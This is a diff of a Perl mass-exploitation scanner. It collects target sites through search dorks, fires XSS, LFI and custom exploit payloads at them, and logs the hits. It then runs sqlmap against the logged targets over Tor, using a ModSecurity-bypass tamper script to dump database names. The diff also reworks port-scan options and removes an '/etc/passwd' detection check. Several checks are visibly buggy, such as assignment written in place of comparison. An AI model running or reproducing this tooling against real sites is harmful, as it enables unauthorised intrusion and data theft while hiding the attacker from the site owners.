@@ -145,8 +145,6 @@ my $mstart;
 my $mend;
 my $mbasic;
 my $muser;
-my $mtcp;
-my $mudp;
 my $mall;
 my $msites;
 my $mwpsites;
@@ -179,13 +177,11 @@ Getopt::Long::GetOptions(\my %OPT,
                         'admin' => \$madmin,
 						'shost' => \$msubdomain,
 						'ports' => \$mports,
-						'select' => \$muser,
+						'select=s' => \$muser,
 						'start=s' => \$mstart,
 						'end=s' => \$mend,
-						'tcp' => \$mtcp,
-						'udp' => \$mudp,
-						'all' => \$mall,
-						'basic' => \$mbasic,
+						'all=s' => \$mall,
+						'basic=s' => \$mbasic,
 						'sites' => \$msites,
 						'wp' => \$mwpsites,
 						'joom' => \$mjoomsites,
@@ -228,8 +224,6 @@ if (@ARGV > 0){
 			'ports',
 			'start',
 			'end',
-			'tcp',
-			'udp',
 			'basic',
 			'all',
 			'sites',
@@ -252,7 +246,7 @@ if (@ARGV > 0){
 			'update',
   );
   
-  if (!exists $com{help || tor || dork || level || xss || t || l || xss || valid || exp || sqlmap || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || tcp || udp || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about || select || replaceme || withme || update}) {
+  if (!exists $com{help || tor || dork || level || xss || t || l || xss || valid || exp || sqlmap || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about || select || replaceme || withme || update}) {
 	advise();
   }
 }
@@ -273,6 +267,7 @@ sub timer {
   print "$hr:$min:$sec";
   print "] ";
 }
+
 sub osinfo {
   use Config;
   print color 'bold yellow';
@@ -307,7 +302,9 @@ sub osinfo {
   print "$Config{osname} ";
   print "$Config{archname}\n";
   print color RESET;
+  checkproxy();
 }
+
 sub advise {
   print color 'yellow';
   print "[!] Upss.. Invalid arguments! \n";
@@ -368,7 +365,6 @@ sub mvalidation_text {
 }
 sub Target {
   $Target = $Target;
-  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
 }
 
 sub server {
@@ -442,6 +438,15 @@ sub scandetail {
     print "$mlevel \n";
     print color RESET;
   }
+  if ((defined $sqlmap) || (defined $sqlmaptor)){
+    print color 'bold yellow';
+    print "[+] EXPLOIT:: ";
+    print color RESET;
+    print color 'red';
+    print "Sqlmap \n";
+    print color RESET;
+  }
+
   if (defined $listname) {
     print color 'bold yellow';
     print "[+] LIST:: ";
@@ -450,6 +455,7 @@ sub scandetail {
     print "$listname \n";
     print color RESET;
   }
+  
   if ((defined $mxss) || (defined $mlfi)){
     print color 'bold yellow';
     print "[+] SCAN:: ";
@@ -463,6 +469,7 @@ sub scandetail {
     }
     print color RESET;
   }  
+
 
   if ((defined $validation_text) || (defined $misup) || (defined $mhttpd) ) {
     print color 'bold yellow';
@@ -490,8 +497,6 @@ sub scandetail {
     print color RESET;
   }
   
-  if ((defined $sqlmap) || (defined $mjoomrfi) || (defined $mjoomsites) || (defined $mwpsites) || (defined $mcommand) || (defined $mwpadf) || (defined $madmin) || (defined $msites) || (defined $msubdomain) || (defined $mports) || ((defined $replaceme) && (defined $withme))) {
-  
   if (defined $mwpsites) {
     print color 'bold yellow';
     print "[+] LIST:: ";
@@ -499,15 +504,15 @@ sub scandetail {
     print color 'red';
     print "Server_sites_Scan.txt \n";
     print color RESET;
-  }  
+    }  
+
+  if ((defined $mjoomrfi) || (defined $mjoomsites) || (defined $mwpsites) || (defined $mcommand) || (defined $mwpadf) || (defined $madmin) || (defined $msites) || (defined $msubdomain) || (defined $mports) || ((defined $replaceme) || (defined $withme) || (defined $mzipsites) || (defined $muploadsites))) {
+
     print color 'bold yellow';
     print "[+] EXPLOITATION:: ";
     print color RESET;
-    
+
     print color 'red';
-    if (defined $sqlmap) {
-      print "Sqlmap \n";
-    }
     if ((defined $replaceme) && (defined $withme)) {
       print "$replaceme To $withme \n";
 	}	
@@ -559,17 +564,14 @@ sub scandetail {
     if (defined $muser) {
       print "Select Scan ";
     }
+	if (($mbasic eq "udp") || ($mall eq "udp") || ($muser eq "udp")) {
+	  print "UDP ";
+	}
+	if (($mbasic eq "tcp") || ($mall eq "tcp") || ($muser eq "tcp")) {
+	  print "TCP ";
+	}
     if ((defined $mstart) && (defined $mend)) {
       print "[$mstart To $mend] ";
-    }
-    if ((defined $mtcp) && (defined $mudp)) {
-      print "Tcp+Udp \n";
-    }
-    if ((!defined $mtcp) && (defined $mudp)) {
-      print "Udp \n";
-    }
-    if ((defined $mtcp) && (!defined $mudp)) {
-      print "Tcp \n";
     }
     print color RESET;
   }
@@ -923,6 +925,7 @@ sub mlisup {
   listchekisup();
   mlistname();
   mexploit();
+  #scandetail();
   countargets();
   open (TEXT, $listname);
   while (my $URL = <TEXT>) { 
@@ -934,36 +937,43 @@ sub mlisup {
 	print color RESET;
 	print "$URL \n";
 	
+    my $URL1 = $URL;
+    $request = HTTP::Request->new('GET', $URL);
+    $response= $ua->request($request);
+    print color 'bold yellow';
+    print "  [+] INFO: ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+	
 	print color 'bold yellow';
-	print "[!] VULN: ";
+	print "  [+] EXPL: ";
+	print color RESET;
+    print "$exploit \n";
+	
+	print color 'bold yellow';
+	print "  [+] VULN: ";
 	print color RESET;
 
-    my $URL = $URL;
-    $URL =~ s/ //g;
-    $useragent = LWP::UserAgent->new;
-    $resp = $useragent->head($URL);
-    if ((head($URL)) && ($resp !~ not found)) {
+    my $URL = $URL.$exploit;
+    $URL =~ s/ //g;	
+    $request = HTTP::Request->new('GET', $URL);
+    $resp= $ua->request($request);
+	if (( $resp->is_success and !$resp->previous ) && ($resp !~ m/not found/i)) {
       print color 'green';
-      print "[+] $URL\n";
+      print "$URL\n";
       print color RESET;
 	  
-      use Socket;
-      my $URL=$URL;	 
-      $URL =~ s/\/.*//s;
-      $ip = gethostbyname($URL);
-      if ($ip) {
-        printf "%s", "IP: ".inet_ntoa($ip);
-        undef $ip;
-        print "\n";
-	  }
+	  open (INFO, '>>Validated_Scan.txt');
+      print INFO "$URL\n";
+	  close (INFO);
     }else{
       print color 'red';
-      print "[+] Not Vulnerable! \n";
+      print "Not Vulnerable! \n";
       print color RESET;
 	}
-	open (INFO, '>>Validated_Scan.txt');
-    print INFO "$URL\n";
-	close (INFO);
     print "[ ]............................................................................ \n";
   }
   finisup();
@@ -973,44 +983,55 @@ sub mtisup {
   listchekisup();
   Target();
   mexploit();
-  forwait();
+  scandetail();
   my $URL = $Target;
   $URL =~ s/ //g;
+  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
   
+  print "[ ]............................................................................ \n";
+
   print color 'bold yellow';
   print "[!] TARGET: ";
   print color RESET;
   print "$URL \n";
 	
+  my $URL1 = $URL;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
   print color 'bold yellow';
-  print "[!] VULN: ";
+  print "  [+] INFO: ";
   print color RESET;
-  
-  $useragent = LWP::UserAgent->new;
-  $resp = $useragent->head($URL);
-  if ((head($URL)) && ($resp !~ not found)) {
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
+	
+  print color 'bold yellow';
+  print "  [+] EXPL: ";
+  print color RESET;
+  print "$exploit \n";
+	
+  print color 'bold yellow';
+  print "  [+] VULN: ";
+  print color RESET;
+ 
+  my $URL = $URL.$exploit;
+  $URL =~ s/ //g;
+  $request = HTTP::Request->new('GET', $URL);
+  $resp= $ua->request($request);
+  if (( $resp->is_success and !$resp->previous ) && ($resp !~ m/not found/i)) {
     print color 'green';
-    print "[+] $URL\n";
+    print "$URL\n";
     print color RESET;
-
-    use Socket;
-    my $URL=$URL;	 
-    $URL =~ s/\/.*//s;
-    $ip = gethostbyname($URL);
-    if ($ip) {
-      printf "%s", "IP: ".inet_ntoa($ip);
-      undef $ip;
-      print "\n";
-	}
+	
+    open (INFO, '>>Validated_Scan.txt');
+    print INFO "$URL\n";
+    close (INFO);
   }else{
     print color 'red';
-    print "[+] Not Vulnerable! \n";
+    print "Not Vulnerable! \n";
     print color RESET;
   }
-
-  open (INFO, '>>Validated_Scan.txt');
-  print INFO "$URL\n";
-  close (INFO);
   print "[ ]............................................................................ \n";
   finisup();
 }
@@ -1035,56 +1056,62 @@ sub siteinfo {
   }  
 }
 	
-
-
 sub mlvalidation {
   listchekvalidation();
   mlistname();
   mexploit();
+  #scandetail();
   countargets();
   open (TEXT, $listname);
-  while (my $URL= <TEXT>) { 
+  while (my $URL = <TEXT>) { 
     chomp $URL;
     if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
 	
-    print color 'bold yellow';
-    print "[!] TARGET: ";
-    print color RESET;
-    print "$URL \n";
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print "$URL \n";
 	
+    my $URL1 = $URL;
+    $request = HTTP::Request->new('GET', $URL);
+    $response= $ua->request($request);
     print color 'bold yellow';
-    print "[!] VULN: ";
+    print "  [+] INFO: ";
     print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
 	
-    my $URL = $URL;
-    $URL =~ s/ //g;
+	print color 'bold yellow';
+	print "  [+] EXPL: ";
+	print color RESET;
+    print "$exploit \n";
+	
+	print color 'bold yellow';
+	print "  [+] VULN: ";
+	print color RESET;
+
+    my $URL = $URL.$exploit;
+    $URL =~ s/ //g;	
+      print INFO "$URL\n";
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
-    my $html = $response->content;
-    if($html =~ m/$validation_text/i){
+    my $Source = $response->content;
+    if($Source =~ m/$validation_text/i){
       print color 'green';
-      print "[+] $URL\n";
+      print "$URL\n";
       print color RESET;
 	  
-      use Socket;
-      my $URL=$URL;	 
-      $URL =~ s/\/.*//s;
-      $ip = gethostbyname($URL);
-      if ($ip) {
-        printf "%s", "IP: ".inet_ntoa($ip);
-        undef $ip;
-        print "\n";
-	  }
-
 	  open (INFO, '>>Validated_Scan.txt');
       print INFO "$URL\n";
 	  close (INFO);
     }else{
-      print color 'bold yellow';
-      print "[!] Not Vulnerable! \n";
+      print color 'red';
+      print "Not Vulnerable! \n";
       print color RESET;
 	}
-	print "[ ]............................................................................ \n";
+    print "[ ]............................................................................ \n";
   }
   finvalidation();
 }
@@ -1093,48 +1120,59 @@ sub mtvalidation {
   listchekisup();
   Target();
   mexploit();
-  forwait();
+  scandetail();
+  my $URL = $Target;
+  $URL =~ s/ //g;
+  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
   
+  print "[ ]............................................................................ \n";
+
   print color 'bold yellow';
   print "[!] TARGET: ";
   print color RESET;
   print "$URL \n";
 	
+  my $URL1 = $URL;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
   print color 'bold yellow';
-  print "[!] VULN: ";
+  print "  [+] INFO: ";
   print color RESET;
-
-  my $URL = $Target;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
+	
+  print color 'bold yellow';
+  print "  [+] EXPL: ";
+  print color RESET;
+  print "$exploit \n";
+	
+  print color 'bold yellow';
+  print "  [+] VULN: ";
+  print color RESET;
+ 
+  my $URL = $URL.$exploit;
   $URL =~ s/ //g;
   $request = HTTP::Request->new('GET', $URL);
   $response = $ua->request($request);
-  my $html = $response->content;
-  if($html =~ m/$validation_text/i){
+  my $Source = $response->content;
+  if($Source =~ m/$validation_text/i){
     print color 'green';
-    print "[+] $URL\n";
+    print "$URL\n";
     print color RESET;
 	
-    use Socket;
-    my $URL=$URL;	 
-    $URL =~ s/\/.*//s;
-    $ip = gethostbyname($URL);
-    if ($ip) {
-      printf "%s", "IP: ".inet_ntoa($ip);
-      undef $ip;
-      print "\n";
-	}
-
     open (INFO, '>>Validated_Scan.txt');
     print INFO "$URL\n";
     close (INFO);
   }else{
-    print color 'bold yellow';
-    print "[!] Not Vulnerable! \n";
+    print color 'red';
+    print "Not Vulnerable! \n";
     print color RESET;
   }
   print "[ ]............................................................................ \n";
   finvalidation();
-} 
+}
 
 sub countargets {
   my $lc = 0;
@@ -1237,7 +1275,7 @@ sub testconection {
     print "[+] PROXY:: ";
     print color RESET;
     if ((defined $proxy) || (defined $sqlmaptor)) {
-      print color 'red';
+      print color 'green';
 	  print "Yes \n";
 	}else{ 
       print color 'red';
@@ -1247,6 +1285,25 @@ sub testconection {
   }
 }
 
+sub checkproxy {
+  my $URL = "http://www.google.com";
+  $request = HTTP::Request->new('GET', $URL);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "[+] PROXY:: ";
+  print color RESET;
+
+  if ( $response->is_success ) {
+    if ((defined $proxy) || (defined $sqlmaptor)) {
+      print color 'green';
+	  print "Yes \n";
+	}else{ 
+      print color 'red';
+      print "No \n";
+      print color RESET;
+    }
+  }
+}
 
 ##############################################################
 
@@ -1264,7 +1321,6 @@ sub msearch {
     
   my @strings=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
   my $myrand = $strings[int rand @strings];
-  print color 'bold yellow';
   scandetail();
   print color 'bold yellow';
   print "[+] RANDOM SEARCH:: ";
@@ -1280,14 +1336,13 @@ sub msearch {
   print color RESET;
   print color 'bold';
   print "[ ] ---------------------------------------------------------------------------\n";
-  
   print color RESET;
   forwait();
 	
   open (FILE, "dorks.txt");
   while (my $dork = <FILE>) {
     print color 'bold';
-	if ((!defined $exploit) && (!defined $replaceme) && (!defined $withme)  && (!defined $validation_text) && (!defined $misup)) {
+	if ((!defined $exploit) && (!defined $mxss) && (!defined $mlfi) && (!defined $madmin) && (!defined $replaceme) && (!defined $withme) && (!defined $musbdomain) && (!defined $validation_text) && (!defined $misup) && (!defined $msubdomain)) {
       print "[+] DORK:: $dork \n";
       print color RESET;
 	}
@@ -1312,11 +1367,20 @@ sub msearch {
 			  $URL =~ s/\/.*//s;
 			  $URL = $URL.$withme;
 			}
-			if ((defined $exploit) && ((defined $misup) || (defined $validation_text))) {
+			if ((defined $madmin) || (defined $msubdomain)){
 			  $URL =~ s/\/.*//s;
 			}
+			
+			#if (defined $msubdomain){
+	          #if (index($URL, 'http://www.') != -1) {
+	            #$URL =~ s/http:\/\/www.//g;
+	          #}
+	          #if (index($URL, 'www.') != -1) {
+	           # $URL =~ s/www.//g;
+	          #}
+			#}
 
-			if ((!defined $mxss) && (!defined $misup) && (!defined $validation_text)){
+			if ((!defined $mxss) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain)){
 			  print color 'bold yellow';
 			  print "[!] TARGET: ";
 	          print color RESET;
@@ -1328,7 +1392,7 @@ sub msearch {
               $request = HTTP::Request->new('GET', $URL);
               $response = $ua->request($request);
 			  print color 'bold yellow';
-			  print "[!] INFO:   ";
+			  print "[+] INFO:   ";
 	          print color RESET;
               if($response = RC_OK){
                 print "HTTP/1.1 200 OK  ";
@@ -1395,7 +1459,7 @@ sub msearch {
     open my $file, "<", "Search_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	if (!defined $mxss) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $musbdomain)) {
 	  print "[!] $lc Unique Result(s) Found!\n";
 	  print color RESET;
 	  close $file;
@@ -1410,7 +1474,7 @@ sub msearch {
     print color RESET;
   }
 
-  if ((defined $mxss) || (defined $mlfi) || (defined $command) || (defined $misup) || (defined $validation_text) || (defined $sqlmap) || (defined $sqlmaptor)) {
+  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $msubdomain) || (defined $command) || (defined $misup) || (defined $validation_text) || (defined $sqlmap) || (defined $sqlmaptor)) {
   }else{
     print color 'red';
     timer();
@@ -1420,141 +1484,15 @@ sub msearch {
 } ## end sub msearch
 
 ###################################################################
-## bgn mLexplVaXss
-sub mLexplVaXss {
-  listchekxss();
-  XSS();
-  mlistname();
-  mexploit();
-  #############		
-  #scandetail();
-  countargets();
-  open (TEXT, $listname);
-  while (my $Target = <TEXT>) { 
-	chomp $Target;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-    print "$Target \n";
-	
-    my $URL1 = $Target;
-    $request = HTTP::Request->new('GET', $URL1);
-    $response = $ua->request($request);
-    print color 'bold yellow';
-	print "[!] INFO:   ";
-    print color RESET;
-    if($response = RC_OK){
-      print "HTTP/1.1 200 OK  ";
-      print "\n";
-    }
-	
-	foreach $XSS(@XSS){
-	  my $URL = $Target.$exploit;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  print color 'bold yellow';
-	  print "[!] EXPL:   ";
-	  print color RESET;
-      print "$URL \n";
-		
-	  print color 'bold yellow';
-	  print "[!] VULN:   ";
-	  print color RESET;
-
-	  if($html =~ m/$validation_text/i){
-	    print color 'green';
-        print "$URL\n";
-	    print color RESET;
-
-	    open (INFO, '>>XSS_Site_Scan.txt');
-        print INFO "$URL\n";
-	    close (INFO);
-	  }else{
-	    print color 'red';
-        print "No \n";
-	    print color RESET;
-	  }
-	}
-	print "[ ]............................................................................ \n";
-  }
-  finxss();
-  ## end mLexplVaXss
-}
-
-###################################################################
-## bgn mLexplXss
-sub mLexplXss {
-  listchekxss();
-  XSS();
-  mlistname();
-  mexploit();
-  #############		
-  countargets();
-  open (TEXT, $listname);
-  while (my $Target = <TEXT>) { 
-	chomp $Target;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-    print "$Target \n";
-	
-    my $URL1 = $Target;
-    $request = HTTP::Request->new('GET', $URL1);
-    $response = $ua->request($request);
-    print color 'bold yellow';
-	print "[!] INFO:   ";
-    print color RESET;
-    if($response = RC_OK){
-      print "HTTP/1.1 200 OK  ";
-      print "\n";
-    }  
-
-	foreach $XSS(@XSS){
-	  my $URL = $Target.$exploit;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  print color 'bold yellow';
-	  print "[!] EXPL:   ";
-	  print color RESET;
-      print "$URL \n";
-		
-	  print color 'bold yellow';
-	  print "[!] VULN:   ";
-	  print color RESET;
-
-	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
-	    print color 'green';
-        print "$URL\n";
-	    print color RESET;
-
-	    open (INFO, '>>XSS_Site_Scan.txt');
-        print INFO "$URL\n";
-	    close (INFO);
-	  }else{
-	    print color 'red';
-        print "No \n";
-	    print color RESET;
-	  }
-	}
-	print "[ ]............................................................................ \n";
-  }
-  finxss();
-}
-
 ###################################################################		
 ## bgn mLXss
 sub mLXss  {
   listchekxss();
   XSS();
   mlistname();
+  if (!defined $dork) {
+    scandetail();
+  }
   countargets();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
@@ -1566,32 +1504,29 @@ sub mLXss  {
     print "$Target \n";
 	
     my $Target = $Target;
-	if($Target !~ /http:\/\//) { $Target = "$Target"; };
     $request = HTTP::Request->new('GET', $Target);
     $response = $ua->request($request);
     print color 'bold yellow';
-	print "[!] INFO:   ";
+	print "  [+] INFO: ";
     print color RESET;
     if($response = RC_OK){
       print "HTTP/1.1 200 OK  ";
       print "\n";
-    }  
-
-
+    }
+	  
 	foreach $XSS(@XSS){
-	
       my $URL = $Target.$XSS;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
 	  
 	  print color 'bold yellow';
-	  print "[!] EXPL:   ";
+	  print "[+] EXPL:   ";
 	  print color RESET;
-      print "$URL \n";
+      print "$XSS \n";
 		
 	  print color 'bold yellow';
-	  print "[!] VULN:   ";
+	  print "[+] VULN:   ";
 	  print color RESET;
 
 	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
@@ -1599,11 +1534,11 @@ sub mLXss  {
         print "$URL\n";
 	    print color RESET;
 		open (INFO, '>>XSS_Site_Scan.txt');
-        print INFO "$URL\n";
-		close (INFO);
+        print INFO "$Target\n";
+        close (INFO);
 	  }else{
 	    print color 'red';
-        print "No \n";
+        print "Not Vulnerable! \n";
 	    print color RESET;
 	  }
     }
@@ -1613,155 +1548,55 @@ sub mLXss  {
 }
 
 ###################################################################		
-## bgn mtexplVaXss
-sub mtexplVaXss {
-  listchekxss();
-  Target();
-  mexploit();
-  mvalidation_text();
-  #scandetail();
-  
-  print color 'bold yellow';
-  print "[!] TARGET: ";
-  print color RESET;
-  print "$Target \n";
-  
-  my $URL1 = $Target;
-  $request = HTTP::Request->new('GET', $URL1);
-  $response = $ua->request($request);
-  print color 'bold yellow';
-  print "[!] INFO:   ";
-  print color RESET;
-  if($response = RC_OK){
-    print "HTTP/1.1 200 OK  ";
-    print "\n";
-  }  
-  
-    my $URL = $Target.$exploit;
-    $URL =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL);
-    $response = $ua->request($request);
-    my $html = $response->content;
-	
-	print color 'bold yellow';
-	print "[!] EXPL:   ";
-	print color RESET;
-    print "$URL \n";
-		
-	print color 'bold yellow';
-	print "[!] VULN:   ";
-	print color RESET;
-	
-    if($html =~ m/$validation_text/i){
-	  print color 'green';
-      print "$URL\n";
-	  print color RESET;
-			
-	  open (INFO, '>>XSS_Site_Scan.txt');
-      print INFO "$URL\n";
-	  close (INFO);
-	}else{
-	  print color 'red';
-      print "No \n";
-	  print color RESET;
-	}
-  print "[ ]............................................................................ \n";
-  finxss();
-}
-
-###################################################################		
-## bgn mexplXss
-sub mtexplXss {
-  listchekxss();
-  XSS();
-  Target();
-  mexploit();
-  #scandetail();
-  
-  print color 'bold yellow';
-  print "[!] TARGET: ";
-  print color RESET;
-  print "$Target \n";
-  
-  my $URL1 = $Target;
-  $request = HTTP::Request->new('GET', $URL1);
-  $response = $ua->request($request);
-  print color 'bold yellow';
-  print "[!] INFO:   ";
-  print color RESET;
-  if($response = RC_OK){
-    print "HTTP/1.1 200 OK  ";
-    print "\n";
-  }  
-  
-  my $URL = $Target.$exploit;
-  $URL =~ s/ //g;
-  $request = HTTP::Request->new('GET', $URL);
-  $response = $ua->request($request);
-  my $html = $response->content;
-  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
-	print color 'green';
-    print "[+] $URL\n";
-	print color RESET;
-			
-	open (INFO, '>>XSS_Site_Scan.txt');
-    print INFO "$URL\n";
-	close (INFO);
-  }
-  print "[ ]............................................................................ \n";
-  finxss();
-}
-
 ###################################################################		
 ## bgn mtXss
 sub mtXss{
   listchekxss();
   XSS();
   Target();
-  #scandetail();
+  scandetail();
+  print "[ ]............................................................................ \n";
   
   print color 'bold yellow';
   print "[!] TARGET: ";
   print color RESET;
   print "$Target \n";
   
+  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
   my $URL1 = $Target;
   $request = HTTP::Request->new('GET', $URL1);
   $response = $ua->request($request);
   print color 'bold yellow';
-  print "[!] INFO:   ";
+  print "  [+] INFO: ";
   print color RESET;
   if($response = RC_OK){
     print "HTTP/1.1 200 OK  ";
     print "\n";
   }  
-
   foreach $XSS(@XSS){
     my $URL = $Target.$XSS;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
     my $html = $response->content;
-	
 	  print color 'bold yellow';
-	  print "[!] EXPL:   ";
+	  print "[+] EXPL:   ";
 	  print color RESET;
-      print "$URL \n";
+      print "$XSS \n";
 		
 	  print color 'bold yellow';
-	  print "[!] VULN:   ";
+	  print "[+] VULN:   ";
 	  print color RESET;
 	
     if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
 	  print color 'green';
       print "$URL\n";
 	  print color RESET;
-			
 	  open (INFO, '>>XSS_Site_Scan.txt');
-      print INFO "$URL\n";
+      print INFO "$Target\n";
       close (INFO);
 	}else{
 	  print color 'red';
-      print "No \n";
+      print "Not Vulnerable! \n";
 	  print color RESET;
     }
   }
@@ -1771,16 +1606,29 @@ sub mtXss{
 
 ###################################################################		
 sub sqlmaptor {
-  #scandetail();
+  #osinfo();
   sleep(1);
   open (INFO, 'XSS_Site_Scan.txt');
   while (my $Target = <INFO>) {
 	chomp $Target;
 	$Target =~ s/\%.*//s;
-    print color 'yellow';
-    print "[+] Checking databases...";
+	
+    print "\n[ ]............................................................................ \n";
+    print color 'bold yellow';
+    print "TARGET: ";
     print color RESET;
-		
+	print "$Target \n";
+
+    print color 'bold yellow';
+    print "EXPLOITATION: ";
+    print color RESET;
+	print "Sqlmap \n";
+
+    print color 'yellow';
+    print "[+] Checking databases...\n";
+	sleep(2);
+    print color RESET;
+	
     system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		  
 	### BEG DATABASE
 	DATABASE:; 
@@ -1870,15 +1718,26 @@ sub sqlmaptor {
 ###################################################################		
 ##bgn sqlmap without tor 
 sub sqlmap {
-  #scandetail();
+  #osinfo();
   sleep(1);
   open (INFO, 'XSS_Site_Scan.txt');
   while (my $Target = <INFO>) {
 	chomp $Target;
 	$Target =~ s/\%.*//s;
+    print "\n[ ]............................................................................ \n";
+    print color 'bold yellow';
+    print "TARGET: ";
+    print color RESET;
+	print "$Target \n";
+
+    print color 'bold yellow';
+    print "EXPLOITATION: ";
+    print color RESET;
+	print "Sqlmap \n";
 
     print color 'yellow';
-    print "[+] Checking databases...";
+    print "[+] Checking databases...\n";
+	sleep(2);
     print color RESET;
     system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		
@@ -1971,63 +1830,64 @@ sub sqlmap {
 ###################################################################		
 sub mlistLfi {
   listcheklfi();
-  mlistname();
   LFI();
+  mlistname();
+  if (!defined $dork) {
+    scandetail();
+  }
   countargets();
-  scandetail();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
-    chomp $Target;
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+	chomp $Target;
+	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
 	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
-	print "$Target \n";
-
-
-    foreach $LFI(@LFI){
+    print "$Target \n";
+	
+    my $Target = $Target;
+    $request = HTTP::Request->new('GET', $Target);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "  [+] INFO: ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }
+	  
+	foreach $LFI(@LFI){
       my $URL = $Target.$LFI;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
-      my $Source = $response->content;
-	  if ((defined $validation_txt) && ($Source =~ m/$validation_txt/i)) {
+      my $html = $response->content;
 	  
-	    print color 'bold yellow';
-	    print "[!] VULN: ";
-	    print color RESET;
-	  
+	  print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+      print "$LFI \n";
+		
+	  print color 'bold yellow';
+	  print "  [+] VULN:   ";
+	  print color RESET;
+
+	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
 	    print color 'green';
         print "$URL\n";
 	    print color RESET;
-	    open (INFO, '>>LFI_Scan.txt');
-        print INFO "$URL\n";
-	    close (INFO);
+		open (INFO, '>>LFI_Scan.txt');
+        print INFO "$Target\n";
+        close (INFO);
 	  }else{
-	    if ($Source =~ m/root:x:0:0:root:/i) {
-	      print color 'green';
-          print "$URL\n";
-	      print color RESET;
-		  open (INFO, '>>LFI_Scan.txt');
-          print INFO "$URL\n";
-		  close (INFO);
-	    }
-      } 
-      my $URL1 = $URL;
-      $request = HTTP::Request->new('GET', $URL1);
-      $response = $ua->request($request);
-      print color 'bold yellow';
-      print "[!] INFO:   ";
-      print color RESET;
-      if($response = RC_OK){
-        print "HTTP/1.1 200 OK  ";
-        print "\n";
-      }
-      print "[ ]............................................................................ \n";
-	  
-    } ### END FOREACH
-  } ### END WHILE 
+	    print color 'red';
+        print "Not Vulnerable! \n";
+	    print color RESET;
+	  }
+    }
+	print "[ ]............................................................................ \n";
+  }
   finlfi();
-} ## mlistLfi 
+}
 
 ###################################################################		
 sub mtLfi {
@@ -2035,47 +1895,54 @@ sub mtLfi {
   LFI();
   Target();
   scandetail();
-  countargets();
-  forwait();
+  print "[ ]............................................................................ \n";
   
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target \n";
+  
+  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "  [+] INFO: ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
   foreach $LFI(@LFI){
     my $URL = $Target.$LFI;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
-    my $Source = $response->content;
-	
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-	
-	if ((defined $validation_txt) && ($Source =~ m/$validation_txt/i)) {
-      print color 'green';
-      print "[!] $URL\n";
+    my $html = $response->content;
